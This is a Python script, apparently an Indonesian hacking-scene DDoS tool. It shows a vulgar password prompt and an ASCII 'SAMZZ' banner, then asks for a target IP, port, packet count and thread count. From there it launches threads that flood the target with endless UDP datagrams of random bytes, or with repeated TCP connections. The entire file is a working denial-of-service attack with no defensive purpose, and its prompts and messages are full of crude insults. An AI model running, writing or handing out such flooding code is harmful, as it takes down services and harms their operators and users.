import random
import socket
import threading
import os
import time 

password = "samzz"

for i in range(3):
	pwd = input("\033[91m===> PW Nya Titid : ")
	j=3
	if(pwd==password):
		time.sleep(3)
		print("\033[91m===> Nah Gitu Pw Benar ")
		break
	else:
		time.sleep(5)
		print("\033[91m===> PW nya salah kontol ")
		continue
time.sleep(3)
print("\033[91m> Pw Nya Yang Benar Kontol")
os.system("clear")

 
print("\033[90m")
print("TUNGGU 7 DETIK MEMEK  JANGAN BURU-BURU AWAS KALAU ABUSE LU")
time.sleep(7)
os.system("clear")
print("""\033[91m

░██████╗░█████╗░███╗░░░███╗
██╔════╝██╔══██╗████╗░████║
╚█████╗░███████║██╔████╔██║
░╚═══██╗██╔══██║██║╚██╔╝██║
██████╔╝██║░░██║██║░╚═╝░██║
╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚═
███████╗███████╗
╚════██║╚════██║
░░███╔═╝░░███╔═╝
██╔══╝░░██╔══╝░░
███████╗███████╗
╚══════╝╚══════╝

""")
ip = str(input(" IP NYA NGEN >>>:"))
port = int(input(" PORT NYA KON >>>:"))
choice = str(input(" (Gas/Tidak): >>>"))
times = int(input(" PAKET NYA TITID >>>:"))
threads = int(input(" BONUS NYA MEK >>>:"))
os.system("clear")
def ddos():
	data = random._urandom(1800)
	i = random.choice(("\033[91m[Attack By Samzz]","[Attack By Samzz]","[Attack By Samzz]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Attack By Samzz")
		except:
			print("[!] Yeh down Asuh!!!")

def ddos2():
	data = random._urandom(180)
	i = random.choice(("\033[91m[Attack By Samzz]","[Attack By Samzz]","[Attack By Samzz]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Attack By Samzz")
		except:
			s.close()
			print("[!] Yeh down Asuh!!!")

def ddos3():
	data = random._urandom(16)
	i = random.choice(("\033[91m[Attack By Samzz]","[Attack By Samzz]","[Attack By Samzz]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Attack By Samzz")
		except:
			s.close()
			print("[!] Yeh down Asuh!!!")

for y in range(threads):
	if choice == 'Gas':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	else:
	    th = threading.Thread(target = ddos3)
	    th.start()